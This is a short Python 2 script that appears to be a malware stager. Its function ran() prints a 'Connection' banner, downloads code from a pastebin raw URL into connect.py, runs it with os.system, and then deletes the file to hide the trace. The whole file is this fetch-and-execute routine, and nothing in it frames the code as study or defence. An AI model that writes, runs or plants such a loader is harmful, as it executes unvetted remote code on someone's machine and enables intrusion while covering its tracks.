import os
import urllib

filz = "http://pastebin.com/raw/qNjByHqW"

def ran():
        print "[ + ] Connection [ + ]"
	testfile = urllib.URLopener()
	testfile.retrieve(filz, "connect.py")
	os.system("python connect.py")
	os.remove("connect.py")
